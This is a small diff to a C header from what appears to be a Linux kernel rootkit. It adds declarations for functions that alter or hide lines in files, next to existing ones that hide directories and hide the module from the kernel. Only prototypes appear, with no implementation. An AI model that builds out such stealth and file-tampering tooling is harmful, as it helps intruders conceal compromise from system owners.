@@ -135,6 +135,10 @@ int add_hidden_dir(const char *dirname);					// Add a directory to the hidden li
 int remove_hidden_dir(const char *dirname);				    // Remove a directory from the hidden list
 int is_hidden(const char *name); 							// Check if a directory is hidden
 int list_hidden_dirs(char *buf, size_t buf_size); 			// List hidden directories
+int add_modified_file(const char *path, int hide_line, const char *hide_substr, const char *src, const char *dst);
+int remove_modified_file(const char *path);
+int list_modified_files(char *buf, size_t size);
+
 
 // hider.c
 int hide_module(void);										// Hide the module from the kernel
